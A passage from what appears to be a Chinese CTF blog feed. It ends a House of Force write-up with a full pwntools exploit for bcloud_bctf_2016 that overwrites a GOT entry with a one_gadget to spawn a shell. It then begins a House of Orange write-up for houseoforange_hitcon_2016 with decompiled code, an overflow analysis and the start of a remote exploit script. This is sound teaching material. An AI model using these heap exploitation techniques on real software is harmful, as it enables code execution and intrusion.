<span class="hljs-literal">on</span>e_gadget[<span class="hljs-number">3</span>] + libc_base<br></code></pre></td></tr></tbody></table></figure><p>再次编辑chunk__1将puts函数地址改为one_gadget地址，free（chunk_1）执行exeve(“/bin/sh\x00”)，获得shell。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br>from LibcSearcher import *<br><span class="hljs-title function_">context</span><span class="hljs-params">(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'i386'</span>,log_level=<span class="hljs-string">'debug'</span>)</span> #小端序，linux系统，64位架构,debug<br>#定义gdb调试函数<br>def <span class="hljs-title function_">dbg</span><span class="hljs-params">()</span>:<br>        gdb.<span class="hljs-title function_">attach</span><span class="hljs-params">(sh)</span><br>        <span class="hljs-title function_">pause</span><span class="hljs-params">()</span><br>#命令简写化<br>s       = lambda data               :sh.send(data)<br>sa      = lambda delim,data         :sh.sendafter(delim, data)<br>sl      = lambda data               :sh.sendline(data)<br>sla     = lambda delim,data         :sh.sendlineafter(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :sh.recv(num)<br>ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)<br>itr     = lambda                    :sh.interactive()<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br>lg      = lambda address,data       :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br><br>sh = process(<span class="hljs-string">'./bcloud_bctf_2016'</span>)<br><span class="hljs-meta">#sh = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,26937)</span><br><br>elf = ELF(<span class="hljs-string">'./bcloud_bctf_2016'</span>)<br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>__libc_start_main_got = elf.got[<span class="hljs-string">'__libc_start_main'</span>]<br>free_got = elf.got[<span class="hljs-string">'free'</span>]<br>heap_array = <span class="hljs-number">0x0804B120</span><br> <br>def add(size,content):<br>   sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)<br>   sla(<span class="hljs-string">'note content:'</span>,str(size))<br>   sa(<span class="hljs-string">'content:'</span>,content)<br> <br>def edit(index,content):<br>   sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)<br>   sla(<span class="hljs-string">'id:'</span>,str(index))<br>   sa(<span class="hljs-string">'content:'</span>,content)<br> <br>def delete(index):<br>   sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)<br>   sla(<span class="hljs-string">'id:'</span>,str(index))<br>def main():<br>sa(<span class="hljs-string">'name:'</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>)<br>ru(<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>)<br>heap_addr = u32(r(<span class="hljs-number">4</span>)) <br>lg(<span class="hljs-string">'heap_addr'</span>,heap_addr)<br><span class="hljs-meta">#dbg()</span><br>sa(<span class="hljs-string">'Org:'</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x40</span>)<br>#修改top chunk的size为<span class="hljs-number">-1</span>（<span class="hljs-number">0xFFFFFFFF</span>）<br>sla(<span class="hljs-string">'Host:'</span>,p32(<span class="hljs-number">0xFFFFFFFF</span>))<br>top_chunk_addr = heap_addr + <span class="hljs-number">0x48</span>*<span class="hljs-number">3</span><span class="hljs-number">-0x8</span><br>lg(<span class="hljs-string">'top_chunk_addr'</span>,(top_chunk_addr))<br>offset = heap_array - (top_chunk_addr +<span class="hljs-number">0x8</span>)- <span class="hljs-number">0x8</span><br>lg(<span class="hljs-string">'offset'</span>,offset)<br>add(offset,<span class="hljs-string">'') #0</span><br><span class="hljs-string">add(0x18,'</span>\n<span class="hljs-number">'</span>) #<span class="hljs-number">1</span><br>edit(<span class="hljs-number">1</span>,p32(<span class="hljs-number">0</span>) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + <span class="hljs-number">0x10</span>)  + b<span class="hljs-number">'</span>\x00<span class="hljs-number">'</span>*<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">1</span>,p32(puts_plt) + b<span class="hljs-number">'</span>\n<span class="hljs-number">'</span>)<br>#泄露__libc_start_main_got的地址<br>delete(<span class="hljs-number">2</span>)<br>r(<span class="hljs-number">1</span>)<br>__libc_start_main_addr = u32(r(<span class="hljs-number">4</span>))<br>lg(<span class="hljs-string">'__libc_start_main'</span>,__libc_start_main_addr)<br><span class="hljs-meta">#dbg()</span><br><span class="hljs-string">'''</span><br>libc = LibcSearcher(<span class="hljs-string">'__libc_start_main'</span>,__libc_start_main_addr)<br>libc_base = __libc_start_main_addr - libc.dump(<span class="hljs-string">'__libc_start_main'</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">'system'</span>)<br>lg(<span class="hljs-string">'libc_base'</span>,(libc_base))<br>lg(<span class="hljs-string">'system_addr'</span>,(system_addr))<br>edit(<span class="hljs-number">1</span>,p32(system_addr) + b<span class="hljs-number">'</span>\n<span class="hljs-number">'</span>)<br><span class="hljs-string">'''</span><br>#本地<br>one_gadget = [<span class="hljs-number">0x3ac3c</span>,<span class="hljs-number">0x3ac3e</span>,<span class="hljs-number">0x3ac42</span>,<span class="hljs-number">0x3ac49</span>,<span class="hljs-number">0x5faa5</span>,<span class="hljs-number">0x5faa6</span>]<br>libc = ELF(<span class="hljs-string">'/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so'</span>)<br><span class="hljs-meta">#buu远程</span><br>#one_gadget = [<span class="hljs-number">0x3a80c</span>,<span class="hljs-number">0x3a80e</span>,<span class="hljs-number">0x3a812</span>,<span class="hljs-number">0x3a819</span>,<span class="hljs-number">0x5f065</span>,<span class="hljs-number">0x5f066</span>]<br><span class="hljs-meta">#libc = ELF(<span class="hljs-string">'../../libc-2.23.so--32'</span>)</span><br>libc_base = __libc_start_main_addr - libc.sym[<span class="hljs-string">'__libc_start_main'</span>]<br>onegadget = one_gadget[<span class="hljs-number">3</span>] + libc_base<br>edit(<span class="hljs-number">1</span>,p32(onegadget) + b<span class="hljs-number">'</span>\n<span class="hljs-number">'</span>)<br><span class="hljs-meta">#getshell</span><br>delete(<span class="hljs-number">1</span>)<br>itr()<br>main()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;House Of Force2&lt;/h1&gt;
&lt;p&gt;基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Orange</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Orange/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Orange/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-10-27T13:48:20.557Z</updated>
    
    <content type="html"><![CDATA[<h1>House of orange</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>题目中不存在 free 函数或其他释放堆块的函数。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House of Orange 核心就是通过漏洞利用获得 free 的效果。当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-number">1.</span>篡改top chunk size（注意size需要对齐内存页）<br><span class="hljs-number">2.</span>分配比top chunk size大的chunk。<br><span class="hljs-number">3.</span>现在原来的top chunk进入了unsorted bin中，再次malloc就会从unsored bin中切分出需要的大小，剩余部分作新的unsorted bin。<br></code></pre></td></tr></tbody></table></figure><h3 id="注意：伪造top-chunk-size时，必须满足以下要求"><a href="#注意：伪造top-chunk-size时，必须满足以下要求" class="headerlink" title="注意：伪造top-chunk-size时，必须满足以下要求"></a>注意：伪造top chunk size时，必须满足以下要求</h3><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-number">1.</span>伪造的size必须要对齐到内存页。<br><span class="hljs-number">2.</span>size要大于MINSIZE。<br><span class="hljs-number">3.</span>size要小于之后申请的chunk size + MINISIZE。<br><span class="hljs-number">4.</span>size的prev inuse位必须为<span class="hljs-number">1</span>。<br><span class="hljs-number">5.</span>malloc的大小不能大于mmap分配阈值。<br></code></pre></td></tr></tbody></table></figure><h1>例题</h1><h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange-hitcon-2016"></a>houseoforange_hitcon_2016</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>保护全开，打开ida</p><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>{<br>  <span class="hljs-type">int</span> choice; <span class="hljs-comment">// eax</span><br><br>  sub_1218();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      menu();<br>      choice = my_read(a1, a2);<br>      <span class="hljs-keyword">if</span> ( choice != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      show();<br>    }<br>    <span class="hljs-keyword">if</span> ( choice &gt; <span class="hljs-number">2</span> )<br>    {<br>      <span class="hljs-keyword">if</span> ( choice == <span class="hljs-number">3</span> )<br>      {<br>        edit();<br>      }<br>      <span class="hljs-keyword">else</span><br>      {<br>        <span class="hljs-keyword">if</span> ( choice == <span class="hljs-number">4</span> )<br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"give up"</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        }<br>LABEL_13:<br>        a1 = <span class="hljs-string">"Invalid choice"</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid choice"</span>);<br>      }<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( choice != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      add();<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>会申请三个chunk，chunk_1存放chunk_2和chunk_3的mem指针，chunk_2存放name，chunk_3存放price和color。由于num2的限制，只能使用4次add函数。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> color; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  _QWORD *v3; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  _DWORD *v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">if</span> ( num2 &gt; <span class="hljs-number">3u</span> )                              <span class="hljs-comment">// num开始为0，可利用add4次</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Too many house"</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  }<br>  v3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);   <span class="hljs-comment">//chunk_1</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Length of name :"</span>);<br>  size = my_read();<br>  <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x1000</span> )<br>    size = <span class="hljs-number">0x1000</span>;<br>  v3[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(size);     <span class="hljs-comment">//chunk_2</span><br>  <span class="hljs-keyword">if</span> ( !v3[<span class="hljs-number">1</span>] )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Malloc error !!!"</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  }<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name :"</span>);<br>  my_read2((<span class="hljs-type">void</span> *)v3[<span class="hljs-number">1</span>], size);<br>  v4 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, <span class="hljs-number">8uLL</span>);      <span class="hljs-comment">//chunk_3</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Price of Orange:"</span>);<br>  *v4 = my_read();<br>  ::color();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Color of Orange:"</span>);<br>  color = my_read();<br>  <span class="hljs-keyword">if</span> ( color != <span class="hljs-number">0xDDAA</span> &amp;&amp; (color &lt;= <span class="hljs-number">0</span> || color &gt; <span class="hljs-number">7</span>) )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such color"</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( color == <span class="hljs-number">0xDDAA</span> )<br>    v4[<span class="hljs-number">1</span>] = <span class="hljs-number">0xDDAA</span>;<br>  <span class="hljs-keyword">else</span><br>    v4[<span class="hljs-number">1</span>] = color + <span class="hljs-number">30</span>;<br>  *v3 = v4;<br>  heap_array = v3;<br>  ++num2;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Finish"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_EE6</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-keyword">if</span> ( !heap_array )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such house !"</span>);<br>  <span class="hljs-keyword">if</span> ( *(_DWORD *)(*heap_array + <span class="hljs-number">4LL</span>) == <span class="hljs-number">0xDDAA</span> )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name of house : %s\n"</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)heap_array[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Price of orange : %d\n"</span>, *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)*heap_array);<br>    v0 = rand();<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\x1B[01;38;5;214m%s\x1B[0m\n"</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)&amp;unk_203080 + v0 % <span class="hljs-number">8</span>));<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-keyword">if</span> ( *(<span class="hljs-type">int</span> *)(*heap_array + <span class="hljs-number">4LL</span>) &lt;= <span class="hljs-number">30</span> || *(<span class="hljs-type">int</span> *)(*heap_array + <span class="hljs-number">4LL</span>) &gt; <span class="hljs-number">37</span> )<br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Color corruption!"</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    }<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name of house : %s\n"</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)heap_array[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Price of orange : %d\n"</span>, *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)*heap_array);<br>    v2 = rand();<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\x1B[%dm%s\x1B[0m\n"</span>, *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(*heap_array + <span class="hljs-number">4LL</span>), *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)&amp;unk_203080 + v2 % <span class="hljs-number">8</span>));<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>存在漏洞，修改chunk时的size大小由我们自己修改，可造成堆溢出，修改下一个chunk的内容，edit函数有num作为限制，只能使用3次</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_107C</span><span class="hljs-params">()</span><br>{<br>  _DWORD *v1; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br><br>  <span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">2u</span> )                               <span class="hljs-comment">// num开始为0，可利用edit3次</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You can't upgrade more"</span>);<br>  <span class="hljs-keyword">if</span> ( !heap_array )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such house !"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Length of name :"</span>);<br>  size = my_read();<br>  <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x1000</span> )<br>    size = <span class="hljs-number">4096</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name:"</span>);                              <span class="hljs-comment">// size由我们输入，存在溢出</span><br>  my_read2((<span class="hljs-type">void</span> *)heap_array[<span class="hljs-number">1</span>], size);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Price of Orange: "</span>);<br>  v1 = (_DWORD *)*heap_array;<br>  *v1 = my_read();<br>  color();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Color of Orange: "</span>);<br>  v3 = my_read();<br>  <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">0xDDAA</span> &amp;&amp; (v3 &lt;= <span class="hljs-number">0</span> || v3 &gt; <span class="hljs-number">7</span>) )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such color"</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">0xDDAA</span> )<br>    *(_DWORD *)(*heap_array + <span class="hljs-number">4LL</span>) = <span class="hljs-number">0xDDAA</span>;<br>  <span class="hljs-keyword">else</span><br>    *(_DWORD *)(*heap_array + <span class="hljs-number">4LL</span>) = v3 + <span class="hljs-number">30</span>;<br>  ++num;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Finish"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序不存在free函数，而按照我们的一般思路都是先free一个大于0x7f的chunk，进入unsortedbin，获得libc基地址，之后覆盖hook函数为system函数获得shell。而这道题不能这样做，add和edit函数的使用次数也有限制，这道题的edit函数存在堆溢出，可以考虑使用House of orange，通过修改top chunk为一个比较小的值，然后分配一个很大的chunk，使top chunk进入unsortedbin，从而泄露libc，这样heap基地址也能泄露出来，之后的话，可以使用FSOP，获得shell。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>先把前面的写好</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>  *<br> <br>context(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>) <span class="hljs-comment">#小端序，linux系统，64位架构,debug</span><br> <br>binary = <span class="hljs-string">'./houseoforange_hitcon_2016'</span>  <br><span class="hljs-comment">#sh = process(binary) #连接本地程序</span><br>sh = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-number">26188</span>) <span class="hljs-comment">#连接远程程序</span><br>elf = ELF(binary)     <br>libc = ELF(<span class="hljs-string">'../../libc-2.23.so--64'</span>)  <br><br><span class="hljs-comment">#libc-2.23.so--64</span><br>one_gadget = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>one_gadget[<span class="hljs-number">0</span>] = <span class="hljs-number">0x45216</span><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendafter(delim, data)<br>sl      = <span 